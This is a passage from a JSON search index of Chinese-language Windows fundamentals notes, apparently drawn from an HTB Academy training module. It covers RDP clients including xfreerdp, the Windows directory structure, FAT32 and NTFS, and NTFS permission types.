\u5730\u5740\u4ee5\u901a\u8fc7\u7f51\u7edc\u8fdb\u884c\u901a\u4fe1\uff0c\u5e76\u4e14\u6258\u7ba1\u5728\u76ee\u6807\u8ba1\u7b97\u673a\u4e0a\u7684\u5e94\u7528\u7a0b\u5e8f\u4fa6\u542c\u7279\u5b9a\u7684\u903b\u8f91\u7aef\u53e3\u3002</p> <p>\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 RDP \u4ece\u8fd0\u884c Linux \u6216 Windows \u7684\u653b\u51fb\u4e3b\u673a\u8fde\u63a5\u5230 Windows \u76ee\u6807\u3002<code>Remote Desktop Connection</code>\u5982\u679c\u6211\u4eec\u4ece Windows \u4e3b\u673a\u8fde\u63a5\u5230 Windows \u76ee\u6807\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u79f0\u4e3a(\u00a0mstsc.exe\u00a0)\u7684\u5185\u7f6e RDP \u5ba2\u6237\u7aef\u5e94\u7528\u7a0b\u5e8f\u3002\u67e5\u770b\u4e0b\u9762\u7684\u526a\u8f91\u4ee5\u4e86\u89e3\u57fa\u672c\u7528\u6cd5\uff1a ![[Windows\u57fa\u7840\u77e5\u8bc6.gif]]</p> <p>\u4e3a\u6b64\uff0c\u5fc5\u987b\u5df2\u5728\u76ee\u6807 Windows \u7cfb\u7edf\u4e0a\u5141\u8bb8\u8fdc\u7a0b\u8bbf\u95ee\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cWindows \u64cd\u4f5c\u7cfb\u7edf\u4e0d\u5141\u8bb8\u8fdc\u7a0b\u8bbf\u95ee\u3002HTB Academy \u56e2\u961f\u5df2\u5c06\u6211\u4eec\u7684\u8bb8\u591a Windows \u76ee\u6807\u914d\u7f6e\u4e3a\u5728\u901a\u8fc7 VPN \u8fde\u63a5\u5230 Academy \u5b9e\u9a8c\u5ba4\u540e\u5141\u8bb8 RDP \u8bbf\u95ee\u3002</p> <p>\u8fdc\u7a0b\u684c\u9762\u8fde\u63a5\u8fd8\u5141\u8bb8\u6211\u4eec\u4fdd\u5b58\u8fde\u63a5\u914d\u7f6e\u6587\u4ef6\u3002\u8fd9\u662f IT \u7ba1\u7406\u5458\u7684\u666e\u904d\u4e60\u60ef\uff0c\u56e0\u4e3a\u5b83\u4f7f\u8fde\u63a5\u8fdc\u7a0b\u7cfb\u7edf\u66f4\u52a0\u65b9\u4fbf\u3002 ![[Windows\u57fa\u7840\u77e5\u8bc62.gif]]</p> <p>\u4f5c\u4e3a\u6e17\u900f\u6d4b\u8bd5\u8005\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u53c2\u4e0e\u65f6\u4ece\u67e5\u627e\u8fd9\u4e9b\u4fdd\u5b58\u7684\u8fdc\u7a0b\u684c\u9762\u6587\u4ef6 (\u00a0<code>.rdp</code>) \u4e2d\u53d7\u76ca\u3002</p> <p>\u5b58\u5728\u8bb8\u591a\u5176\u4ed6\u8fdc\u7a0b\u684c\u9762\u5ba2\u6237\u7aef\u5e94\u7528\u7a0b\u5e8f\uff0c\u5176\u4e2d\u4e00\u4e9b\u5217\u5728\u8fd9\u7bc7\u540d\u4e3a\u8fdc\u7a0b\u684c\u9762\u5ba2\u6237\u7aef\u7684 Microsoft \u6587\u7ae0\u4e2d\u3002\u6211\u4eec\u4e0d\u4f1a\u5728\u672c\u6a21\u5757\u4e2d\u4ecb\u7ecd\u6bcf\u4e2a\u8fdc\u7a0b\u684c\u9762\u5ba2\u6237\u7aef\u5e94\u7528\u7a0b\u5e8f\u3002</p>"},{"location":"Windows/Windows%E7%AE%80%E4%BB%8B/#xfreerdp","title":"\u4f7f\u7528 xfreerdp","text":"<p>\u4ece\u57fa\u4e8e Linux \u7684\u653b\u51fb\u4e3b\u673a\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u540d\u4e3axfreerdp\u7684\u5de5\u5177\u8fdc\u7a0b\u8bbf\u95ee Windows \u76ee\u6807\u3002\u60a8\u4f1a\u6ce8\u610f\u5230\u6211\u4eec\u5728\u591a\u4e2a\u6a21\u5757\u4e2d\u4f7f\u7528 xfreerdp\uff0c\u56e0\u4e3a\u5b83\u6613\u4e8e\u4f7f\u7528\u3001\u529f\u80fd\u96c6\u3001\u547d\u4ee4\u884c\u5b9e\u7528\u7a0b\u5e8f\u548c\u6548\u7387\u3002\u67e5\u770b\u4e0b\u9762\u7684\u526a\u8f91\uff0c\u4e86\u89e3 Pwnbox \u7684\u57fa\u672c\u7528\u6cd5\uff1a</p> <p>![[xfreerdp.gif]] \u8bf7\u8bb0\u4f4f\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u5728\u547d\u4ee4\u884c\u4e2d\u590d\u5236\u548c\u7c98\u8d34 xfreerdp \u547d\u4ee4\uff0c\u56e0\u6b64\u6211\u4eec\u4e0d\u9700\u8981\u624b\u52a8\u8f93\u5165\u9009\u9879\u3002xfreerdp \u6709\u51e0\u4e2a\u9009\u9879\u53ef\u4f9b\u6211\u4eec\u4f7f\u7528\uff0c\u4f8b\u5982\u9a71\u52a8\u5668\u91cd\u5b9a\u5411\u4ee5\u4fbf\u80fd\u591f\u5c06\u6587\u4ef6\u4f20\u8f93\u5230\u76ee\u6807\u4e3b\u673a/\u4ece\u76ee\u6807\u4e3b\u673a\u4f20\u8f93\u6587\u4ef6\uff0c\u8fd9\u4e9b\u90fd\u662f\u503c\u5f97\u7ec3\u4e60\u7684\uff0c\u6211\u4eec\u5c06\u5728 HTB \u5b66\u9662\u7684\u5176\u4ed6\u6a21\u5757\u4e2d\u4ecb\u7ecd\u3002</p> <p>\u5b58\u5728\u5176\u4ed6 RDP \u5ba2\u6237\u7aef\uff0c\u4f8b\u5982Remmina\u548crdesktop\uff0c\u6211\u4eec\u9f13\u52b1\u60a8\u4e0e\u5176\u4ed6\u5ba2\u6237\u7aef\u8fdb\u884c\u8bd5\u9a8c\uff0c\u770b\u770b\u4ec0\u4e48\u6700\u9002\u5408\u60a8\u3002\u73b0\u5728\u6211\u4eec\u5df2\u7ecf\u4ecb\u7ecd\u4e86\u8fd9\u4e9b\u6982\u5ff5\uff0c\u8ba9\u6211\u4eec\u901a\u8fc7\u751f\u6210\u4e0b\u9762\u7684\u76ee\u6807\u5e76\u4f7f\u7528\u63d0\u4f9b\u7684\u51ed\u636e\u4f7f\u7528 RDP \u8fde\u63a5\u5230\u5b83\u6765\u5e94\u7528\u5b83\u4eec\u3002</p> <pre><code>$ xfreerdp /v:&lt;targetIp&gt; /u:htb-student /p:Password\n</code></pre>"},{"location":"Windows/Windwos%20%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","title":"Windwos \u57fa\u7840\u77e5\u8bc6","text":""},{"location":"Windows/Windwos%20%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#windows","title":"[[Windows\u7b80\u4ecb]]","text":""},{"location":"Windows/Windwos%20%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#_1","title":"[[\u64cd\u4f5c\u7cfb\u7edf\u7684\u6838\u5fc3]]","text":""},{"location":"Windows/Windwos%20%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#_2","title":"[[\u4f7f\u7528\u670d\u52a1\u548c\u6d41\u7a0b]]","text":""},{"location":"Windows/Windwos%20%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#windows_1","title":"[[\u4e0e Windows \u4ea4\u4e92]]","text":""},{"location":"Windows/Windwos%20%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#windows_2","title":"[[\u8fdb\u4e00\u6b65\u4f7f\u7528Windows]]","text":""},{"location":"Windows/Windwos%20%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#diving-deeper-close-out","title":"[[\u6f5c\u6c34\u66f4\u6df1\u5e76\u5173\u95ed(Diving Deeper &amp; Close Out)]]","text":""},{"location":"Windows/%E4%B8%8E%20Windows%20%E4%BA%A4%E4%BA%92/","title":"\u4e0e Windows \u4ea4\u4e92","text":""},{"location":"Windows/%E4%B8%8E%20Windows%20%E4%BA%A4%E4%BA%92/#windows","title":"\u4e0e Windows \u4ea4\u4e92","text":""},{"location":"Windows/%E4%B8%8E%20Windows%20%E4%BA%A4%E4%BA%92/#windows_1","title":"Windows \u4f1a\u8bdd","text":""},{"location":"Windows/%E4%B8%8E%20Windows%20%E4%BA%A4%E4%BA%92/#windows_2","title":"\u4e0eWindows \u64cd\u4f5c\u7cfb\u7edf\u4ea4\u4e92","text":""},{"location":"Windows/%E4%B8%8E%20Windows%20%E4%BA%A4%E4%BA%92/#windowswmi","title":"Windows\u7ba1\u7406\u89c4\u8303(WMI)","text":""},{"location":"Windows/%E4%BD%BF%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%92%8C%E6%B5%81%E7%A8%8B/","title":"\u4f7f\u7528\u670d\u52a1\u548c\u6d41\u7a0b","text":""},{"location":"Windows/%E4%BD%BF%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%92%8C%E6%B5%81%E7%A8%8B/#_1","title":"\u4f7f\u7528\u670d\u52a1\u548c\u6d41\u7a0b","text":""},{"location":"Windows/%E4%BD%BF%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%92%8C%E6%B5%81%E7%A8%8B/#windows","title":"Windows\u670d\u52a1\u548c\u8fdb\u7a0b","text":""},{"location":"Windows/%E4%BD%BF%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%92%8C%E6%B5%81%E7%A8%8B/#_2","title":"\u670d\u52a1\u6743\u9650","text":""},{"location":"Windows/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%A0%B8%E5%BF%83/","title":"\u64cd\u4f5c\u7cfb\u7edf\u7684\u6838\u5fc3","text":""},{"location":"Windows/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%A0%B8%E5%BF%83/#_1","title":"\u64cd\u4f5c\u7cfb\u7edf\u7684\u6838\u5fc3","text":""},{"location":"Windows/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%A0%B8%E5%BF%83/#_2","title":"\u64cd\u4f5c\u7cfb\u7edf\u7684\u7ed3\u6784","text":"<p>\u5728 Windows \u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u6839\u76ee\u5f55\u662f <code>&lt;drive_letter&gt;:\\</code>\uff08\u901a\u5e38\u662f C \u76d8\uff09\u3002\u6839\u76ee\u5f55\uff08\u4e5f\u79f0\u4e3a\u5f15\u5bfc\u5206\u533a\uff09\u662f\u5b89\u88c5\u64cd\u4f5c\u7cfb\u7edf\u7684\u4f4d\u7f6e\u3002\u5176\u4ed6\u7269\u7406\u548c\u865a\u62df\u9a71\u52a8\u5668\u5206\u914d\u6709\u5176\u4ed6\u5b57\u6bcd\uff0c\u4f8b\u5982 Data (E:)\u3002boot\u5206\u533a\u7684\u76ee\u5f55\u7ed3\u6784\u5982\u4e0b\uff1a |         \u76ee\u5f55             |         \u529f\u80fd               | |--------------------------|---------------------------| |Perflogs                 | \u53ef\u4ee5\u4fdd\u5b58 Windows \u6027\u80fd\u65e5\u5fd7\uff0c\u4f46\u9ed8\u8ba4\u4e3a\u7a7a\u3002| |Program Files                 | \u5728 32 \u4f4d\u7cfb\u7edf\u4e0a\uff0c\u6240\u6709 16 \u4f4d\u548c 32 \u4f4d\u7a0b\u5e8f\u90fd\u5b89\u88c5\u5728\u6b64\u5904\u3002\u5728 64 \u4f4d\u7cfb\u7edf\u4e0a\uff0c\u8fd9\u91cc\u53ea\u5b89\u88c5 64 \u4f4d\u7a0b\u5e8f\u3002| |Program Files(x86)            | 32 \u4f4d\u548c 16 \u4f4d\u7a0b\u5e8f\u5b89\u88c5\u5728 64 \u4f4d\u7248\u672c\u7684 Windows \u4e0a\u3002| |ProgramData                  | \u8fd9\u662f\u4e00\u4e2a\u9690\u85cf\u6587\u4ef6\u5939\uff0c\u5176\u4e2d\u5305\u542b\u67d0\u4e9b\u5df2\u5b89\u88c5\u7a0b\u5e8f\u8fd0\u884c\u6240\u5fc5\u9700\u7684\u6570\u636e\u3002\u65e0\u8bba\u662f\u54ea\u4e2a\u7528\u6237\u8fd0\u884c\u5b83\uff0c\u7a0b\u5e8f\u90fd\u53ef\u4ee5\u8bbf\u95ee\u8fd9\u4e9b\u6570\u636e\u3002| |Users                     | \u6b64\u6587\u4ef6\u5939\u5305\u542b\u767b\u5f55\u7cfb\u7edf\u7684\u6bcf\u4e2a\u7528\u6237\u7684\u7528\u6237\u914d\u7f6e\u6587\u4ef6\uff0c\u5e76\u5305\u542b\u4e24\u4e2a\u6587\u4ef6\u5939 Public \u548c Default\u3002 |Default                  | \u8fd9\u662f\u6240\u6709\u5df2\u521b\u5efa\u7528\u6237\u7684\u9ed8\u8ba4\u7528\u6237\u914d\u7f6e\u6587\u4ef6\u6a21\u677f\u3002\u6bcf\u5f53\u5c06\u65b0\u7528\u6237\u6dfb\u52a0\u5230\u7cfb\u7edf\u65f6\uff0c\u4ed6\u4eec\u7684\u914d\u7f6e\u6587\u4ef6\u90fd\u57fa\u4e8e\u9ed8\u8ba4\u914d\u7f6e\u6587\u4ef6\u3002 |Public | \u6b64\u6587\u4ef6\u5939\u65e8\u5728\u4f9b\u8ba1\u7b97\u673a\u7528\u6237\u5171\u4eab\u6587\u4ef6\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6240\u6709\u7528\u6237\u5747\u53ef\u8bbf\u95ee\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u6b64\u6587\u4ef6\u5939\u901a\u8fc7\u7f51\u7edc\u5171\u4eab\uff0c\u4f46\u9700\u8981\u6709\u6548\u7684\u7f51\u7edc\u5e10\u6237\u624d\u80fd\u8bbf\u95ee\u3002 |AppData | \u6bcf\u4e2a\u7528\u6237\u7684\u5e94\u7528\u7a0b\u5e8f\u6570\u636e\u548c\u8bbe\u7f6e\u90fd\u5b58\u50a8\u5728\u4e00\u4e2a\u9690\u85cf\u7684\u7528\u6237\u5b50\u6587\u4ef6\u5939\u4e2d\uff08\u5373\uff0ccliff.moore\\AppData\uff09\u3002\u8fd9\u4e9b\u6587\u4ef6\u5939\u4e2d\u7684\u6bcf\u4e00\u4e2a\u90fd\u5305\u542b\u4e09\u4e2a\u5b50\u6587\u4ef6\u5939\u3002Roaming \u6587\u4ef6\u5939\u5305\u542b\u5e94\u9075\u5faa\u7528\u6237\u914d\u7f6e\u6587\u4ef6\u7684\u4e0e\u673a\u5668\u65e0\u5173\u7684\u6570\u636e\uff0c\u4f8b\u5982\u81ea\u5b9a\u4e49\u8bcd\u5178\u3002\u672c\u5730\u6587\u4ef6\u5939\u7279\u5b9a\u4e8e\u8ba1\u7b97\u673a\u672c\u8eab\uff0c\u5e76\u4e14\u4ece\u4e0d\u901a\u8fc7\u7f51\u7edc\u540c\u6b65\u3002LocalLow \u7c7b\u4f3c\u4e8e Local \u6587\u4ef6\u5939\uff0c\u4f46\u5b83\u7684\u6570\u636e\u5b8c\u6574\u6027\u7ea7\u522b\u8f83\u4f4e\u3002\u56e0\u6b64\uff0c\u5b83\u53ef\u4ee5\u88ab\u8bbe\u7f6e\u4e3a\u53d7\u4fdd\u62a4\u6216\u5b89\u5168\u6a21\u5f0f\u7684\u7f51\u7edc\u6d4f\u89c8\u5668\u4f7f\u7528\u3002 |Windows | Windows \u64cd\u4f5c\u7cfb\u7edf\u6240\u9700\u7684\u5927\u90e8\u5206\u6587\u4ef6\u90fd\u5305\u542b\u5728\u6b64\u5904\u3002 |System, System32, SysWOW64 | \u5305\u542b Windows \u548c Windows API \u7684\u6838\u5fc3\u529f\u80fd\u6240\u9700\u7684\u6240\u6709 DLL\u3002\u6bcf\u5f53\u7a0b\u5e8f\u8981\u6c42\u52a0\u8f7d DLL \u800c\u4e0d\u6307\u5b9a\u7edd\u5bf9\u8def\u5f84\u65f6\uff0c\u64cd\u4f5c\u7cfb\u7edf\u90fd\u4f1a\u641c\u7d22\u8fd9\u4e9b\u6587\u4ef6\u5939\u3002 |WinSxS | Windows \u7ec4\u4ef6\u5b58\u50a8\u5305\u542b\u6240\u6709 Windows \u7ec4\u4ef6\u3001\u66f4\u65b0\u548c\u670d\u52a1\u5305\u7684\u526f\u672c\u3002</p>"},{"location":"Windows/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%A0%B8%E5%BF%83/#_3","title":"\u4f7f\u7528\u547d\u4ee4\u884c\u63a2\u7d22\u76ee\u5f55","text":"<pre><code>C:\\htb&gt; dir c:\\ /a\n Volume in drive C has no label.\n Volume Serial Number is F416-77BE\n\n Directory of c:\\\n\n08/16/2020  10:33 AM    &lt;DIR&gt;          $Recycle.Bin\n06/25/2020  06:25 PM    &lt;DIR&gt;          $WinREAgent\n07/02/2020  12:55 PM             1,024 AMTAG.BIN\n06/25/2020  03:38 PM    &lt;JUNCTION&gt;     Documents and Settings [C:\\Users]\n08/13/2020  06:03 PM             8,192 DumpStack.log\n08/17/2020  12:11 PM             8,192 DumpStack.log.tmp\n08/27/2020  10:42 AM    37,752,373,248 hiberfil.sys\n08/17/2020  12:11 PM    13,421,772,800 pagefile.sys\n12/07/2019  05:14 AM    &lt;DIR&gt;          PerfLogs\n08/24/2020  10:38 AM    &lt;DIR&gt;          Program Files\n07/09/2020  06:08 PM    &lt;DIR&gt;          Program Files (x86)\n08/24/2020  10:41 AM    &lt;DIR&gt;          ProgramData\n06/25/2020  03:38 PM    &lt;DIR&gt;          Recovery\n06/25/2020  03:57 PM             2,918 RHDSetup.log\n08/17/2020  12:11 PM        16,777,216 swapfile.sys\n08/26/2020  02:51 PM    &lt;DIR&gt;          System Volume Information\n08/16/2020  10:33 AM    &lt;DIR&gt;          Users\n08/17/2020  11:38 PM    &lt;DIR&gt;          Windows\n               7 File(s) 51,190,943,590 bytes\n              13 Dir(s)  261,310,697,472 bytes free\n</code></pre> <p>tree\u5b9e\u7528\u7a0b\u5e8f\u53ef\u7528\u4e8e\u4ee5\u56fe\u5f62\u65b9\u5f0f\u663e\u793a\u8def\u5f84\u6216\u78c1\u76d8\u7684\u76ee\u5f55\u7ed3\u6784\u3002</p> <pre><code>C:\\htb&gt; tree \"c:\\Program Files (x86)\\VMware\"\nFolder PATH listing\nVolume serial number is F416-77BE\nC:\\PROGRAM FILES (X86)\\VMWARE\n\u251c\u2500\u2500\u2500VMware VIX\n\u2502   \u251c\u2500\u2500\u2500doc\n\u2502   \u2502   \u251c\u2500\u2500\u2500errors\n\u2502   \u2502   \u251c\u2500\u2500\u2500features\n\u2502   \u2502   \u251c\u2500\u2500\u2500lang\n\u2502   \u2502   \u2502   \u2514\u2500\u2500\u2500c\n\u2502   \u2502   \u2502       \u2514\u2500\u2500\u2500functions\n\u2502   \u2502   \u2514\u2500\u2500\u2500types\n\u2502   \u251c\u2500\u2500\u2500samples\n\u2502   \u2514\u2500\u2500\u2500Workstation-15.0.0\n\u2502       \u251c\u2500\u2500\u250032bit\n\u2502       \u2514\u2500\u2500\u250064bit\n\u2514\u2500\u2500\u2500VMware Workstation\n    \u251c\u2500\u2500\u2500env\n    \u251c\u2500\u2500\u2500hostd\n    \u2502   \u251c\u2500\u2500\u2500coreLocale\n    \u2502   \u2502   \u2514\u2500\u2500\u2500en\n    \u2502   \u251c\u2500\u2500\u2500docroot\n    \u2502   \u2502   \u251c\u2500\u2500\u2500client\n    \u2502   \u2502   \u2514\u2500\u2500\u2500sdk\n    \u2502   \u251c\u2500\u2500\u2500extensions\n    \u2502   \u2502   \u2514\u2500\u2500\u2500hostdiag\n    \u2502   \u2502       \u2514\u2500\u2500\u2500locale\n    \u2502   \u2502           \u2514\u2500\u2500\u2500en\n    \u2502   \u2514\u2500\u2500\u2500vimLocale\n    \u2502       \u2514\u2500\u2500\u2500en\n    \u251c\u2500\u2500\u2500ico\n    \u251c\u2500\u2500\u2500messages\n    \u2502   \u251c\u2500\u2500\u2500ja\n    \u2502   \u2514\u2500\u2500\u2500zh_CN\n    \u251c\u2500\u2500\u2500OVFTool\n    \u2502   \u251c\u2500\u2500\u2500env\n    \u2502   \u2502   \u2514\u2500\u2500\u2500en\n    \u2502   \u2514\u2500\u2500\u2500schemas\n    \u2502       \u251c\u2500\u2500\u2500DMTF\n    \u2502       \u2514\u2500\u2500\u2500vmware\n    \u251c\u2500\u2500\u2500Resources\n    \u251c\u2500\u2500\u2500tools-upgraders\n    \u2514\u2500\u2500\u2500x64\n</code></pre> <p>The\u00a0<code>tree</code>\u00a0command can provide us with a large amount of information. The following command can be used to walk through all the files in the C drive, one screen at a time. This command can be modified to be run against any directory.</p> <p>\u8be5<code>tree</code>\u547d\u4ee4\u53ef\u4ee5\u4e3a\u6211\u4eec\u63d0\u4f9b\u5927\u91cf\u4fe1\u606f\u3002\u4ee5\u4e0b\u547d\u4ee4\u53ef\u7528\u4e8e\u904d\u5386 C \u76d8\u4e2d\u7684\u6240\u6709\u6587\u4ef6\uff0c\u4e00\u6b21\u4e00\u5c4f\u3002\u53ef\u4ee5\u4fee\u6539\u6b64\u547d\u4ee4\u4ee5\u9488\u5bf9\u4efb\u4f55\u76ee\u5f55\u8fd0\u884c\u3002</p> <pre><code>tree c:\\ /f | more\n</code></pre>"},{"location":"Windows/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%A0%B8%E5%BF%83/#_4","title":"\u6587\u4ef6\u7cfb\u7edf","text":"<p>Windows \u6587\u4ef6\u7cfb\u7edf\u6709 5 \u79cd\u7c7b\u578b\uff1aFAT12\u3001FAT16\u3001FAT32\u3001NTFS \u548c exFAT\u3002FAT12 \u548c FAT16 \u4e0d\u518d\u7528\u4e8e\u73b0\u4ee3 Windows \u64cd\u4f5c\u7cfb\u7edf\u3002\u6211\u4eec\u5c06\u5728\u672c\u6b21\u57f9\u8bad\u4e2d\u6d89\u53ca FAT32 \u548c exFAT \u6587\u4ef6\u7cfb\u7edf\uff0c\u4f46\u6211\u4eec\u7684\u4e3b\u8981\u91cd\u70b9\u5c06\u662f NTFS \u6587\u4ef6\u7cfb\u7edf\u3002</p> <p>FAT32\uff08\u6587\u4ef6\u5206\u914d\u8868\uff09\u5e7f\u6cdb\u7528\u4e8e\u591a\u79cd\u7c7b\u578b\u7684\u5b58\u50a8\u8bbe\u5907\uff0c\u4f8b\u5982 USB \u8bb0\u5fc6\u68d2\u548c SD \u5361\uff0c\u4f46\u4e5f\u53ef\u7528\u4e8e\u683c\u5f0f\u5316\u786c\u76d8\u9a71\u52a8\u5668\u3002\u540d\u79f0\u4e2d\u7684\u201c32\u201d\u662f\u6307FAT32 \u4f7f\u752832 \u4f4d\u6570\u636e\u6765\u8bc6\u522b\u5b58\u50a8\u8bbe\u5907\u4e0a\u7684\u6570\u636e\u7c07\u3002</p> <p><code>Pros of FAT32:</code></p> <ul> <li>\u8bbe\u5907\u517c\u5bb9\u6027\u2014\u2014\u5b83\u53ef\u7528\u4e8e\u8ba1\u7b97\u673a\u3001\u6570\u7801\u76f8\u673a\u3001\u6e38\u620f\u673a\u3001\u667a\u80fd\u624b\u673a\u3001\u5e73\u677f\u7535\u8111\u7b49\u3002</li> <li> <p>\u64cd\u4f5c\u7cfb\u7edf\u4ea4\u53c9\u517c\u5bb9\u6027\u2014\u2014\u5b83\u9002\u7528\u4e8e\u4ece Windows 95 \u5f00\u59cb\u7684\u6240\u6709 Windows \u64cd\u4f5c\u7cfb\u7edf\uff0c\u5e76\u4e14\u8fd8\u652f\u6301 MacOS \u548c Linux <code>Cons of FAT32:</code></p> </li> <li> <p>\u53ea\u80fd\u7528\u4e8e\u5c0f\u4e8e 4GB \u7684\u6587\u4ef6\u3002</p> </li> <li>\u6ca1\u6709\u5185\u7f6e\u7684\u6570\u636e\u4fdd\u62a4\u6216\u6587\u4ef6\u538b\u7f29\u529f\u80fd\u3002</li> <li>\u5fc5\u987b\u4f7f\u7528\u7b2c\u4e09\u65b9\u5de5\u5177\u8fdb\u884c\u6587\u4ef6\u52a0\u5bc6\u3002</li> </ul> <p>NTFS\uff08\u65b0\u6280\u672f\u6587\u4ef6\u7cfb\u7edf\uff09\u662f\u81ea Windows NT 3.1 \u4ee5\u6765\u7684\u9ed8\u8ba4 Windows \u6587\u4ef6\u7cfb\u7edf\u3002NTFS\u9664\u4e86\u5f25\u8865FAT32\u7684\u4e0d\u8db3\u4e4b\u5916\uff0c\u8fd8\u56e0\u4e3a\u6539\u8fdb\u4e86\u6570\u636e\u7ed3\u6784\uff0c\u5bf9\u5143\u6570\u636e\u6709\u66f4\u597d\u7684\u652f\u6301\uff0c\u6027\u80fd\u4e5f\u66f4\u597d\u3002</p> <p><code>Pros of NTFS:</code></p> <ul> <li>NTFS \u662f\u53ef\u9760\u7684\uff0c\u53ef\u4ee5\u5728\u7cfb\u7edf\u6545\u969c\u6216\u65ad\u7535\u7684\u60c5\u51b5\u4e0b\u6062\u590d\u6587\u4ef6\u7cfb\u7edf\u7684\u4e00\u81f4\u6027\u3002</li> <li>\u901a\u8fc7\u5141\u8bb8\u6211\u4eec\u5bf9\u6587\u4ef6\u548c\u6587\u4ef6\u5939\u8bbe\u7f6e\u7cbe\u7ec6\u6743\u9650\u6765\u63d0\u4f9b\u5b89\u5168\u6027\u3002</li> <li>\u652f\u6301\u975e\u5e38\u5927\u7684\u5206\u533a\u3002</li> <li>\u5177\u6709\u5185\u7f6e\u65e5\u5fd7\u529f\u80fd\uff0c\u8fd9\u610f\u5473\u7740\u8bb0\u5f55\u6587\u4ef6\u4fee\u6539\uff08\u6dfb\u52a0\u3001\u4fee\u6539\u3001\u5220\u9664\uff09\u3002</li> </ul> <p><code>Cons of NTFS:</code></p> <ul> <li>\u5927\u591a\u6570\u79fb\u52a8\u8bbe\u5907\u672c\u8eab\u4e0d\u652f\u6301 NTFS\u3002</li> <li>\u7535\u89c6\u548c\u6570\u7801\u76f8\u673a\u7b49\u8f83\u65e7\u7684\u5a92\u4f53\u8bbe\u5907\u4e0d\u652f\u6301 NTFS \u5b58\u50a8\u8bbe\u5907\u3002</li> </ul>"},{"location":"Windows/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%A0%B8%E5%BF%83/#_5","title":"\u6743\u9650","text":"<p>NTFS \u6587\u4ef6\u7cfb\u7edf\u5177\u6709\u8bb8\u591a\u57fa\u672c\u548c\u9ad8\u7ea7\u6743\u9650\u3002\u4e00\u4e9b\u5173\u952e\u7684\u6743\u9650\u7c7b\u578b\u662f\uff1a | \u6743\u9650\u7c7b\u578b | \u63cf\u8ff0 | |:----------:|-------| | Full Control\u5b8c\u5168\u63a7\u5236 | \u5141\u8bb8\u8bfb\u53d6\u3001\u5199\u5165\u3001\u66f4\u6539\u3001\u5220\u200b\u200b\u9664\u6587\u4ef6/\u6587\u4ef6\u5939\u3002| | Modify\u8c03\u6574 | \u5141\u8bb8\u8bfb\u53d6\u3001\u5199\u5165\u548c\u5220\u9664\u6587\u4ef6/\u6587\u4ef6\u5939\u3002| |List Folder Contents\u5217\u51fa\u6587\u4ef6\u5939\u5185\u5bb9 | \u5141\u8bb8\u67e5\u770b\u548c\u5217\u51fa\u6587\u4ef6\u5939\u548c\u5b50\u6587\u4ef6\u5939\u4ee5\u53ca\u6267\u884c\u6587\u4ef6\u3002\u6587\u4ef6\u5939\u4ec5\u7ee7\u627f\u6b64\u6743\u9650\u3002| | Read and Execute\u8bfb\u53d6\u548c\u6267\u884c | \u5141\u8bb8\u67e5\u770b\u548c\u5217\u51fa\u6587\u4ef6\u548c\u5b50\u6587\u4ef6\u5939\u4ee5\u53ca\u6267\u884c\u6587\u4ef6\u3002\u6587\u4ef6\u548c\u6587\u4ef6\u5939\u7ee7\u627f\u6b64\u6743\u9650\u3002| | \u5199 | \u5141\u8bb8\u5c06\u6587\u4ef6\u6dfb\u52a0\u5230\u6587\u4ef6\u5939\u548c\u5b50\u6587\u4ef6\u5939\u4ee5\u53ca\u5199\u5165\u6587\u4ef6\u3002| | \u8bfb | \u5141\u8bb8\u67e5\u770b\u548c\u5217\u51fa\u6587\u4ef6\u5939\u548c\u5b50\u6587\u4ef6\u5939\u4ee5\u53ca\u67e5\u770b\u6587\u4ef6\u7684\u5185\u5bb9\u3002| | Traverse Folder\u904d\u5386\u6587\u4ef6\u5939 | \u8fd9\u5141\u8bb8\u6216\u62d2\u7edd\u901a\u8fc7\u6587\u4ef6\u5939\u79fb\u52a8\u4ee5\u8bbf\u95ee\u5176\u4ed6\u6587\u4ef6\u6216\u6587\u4ef6\u5939\u7684\u80fd\u529b\u3002\u4f8b\u5982\uff0c\u5728\u6b64\u793a\u4f8b c:\\users\\bsmith\\documents\\webapps\\backups\\backup_02042020.zip \u4e2d\uff0c\u7528\u6237\u53ef\u80fd\u65e0\u6743\u5217\u51fa\u76ee\u5f55\u5185\u5bb9\u6216\u67e5\u770b\u6587\u6863\u6216 Web \u5e94\u7528\u7a0b\u5e8f\u76ee\u5f55\u4e2d\u7684\u6587\u4ef6\uff0c\u4f46\u5e94\u7528\u4e86\u904d\u5386\u6587\u4ef6\u5939\u6743\u9650\uff0c\u4ed6\u4eec\u53ef\u4ee5\u8bbf\u95ee\u5907\u4efd\u5b58\u6863\u3002|</p> <p>\u6587\u4ef6\u548c\u6587\u4ef6\u5939\u7ee7\u627f\u5176\u7236\u6587\u4ef6\u5939\u7684 NTFS 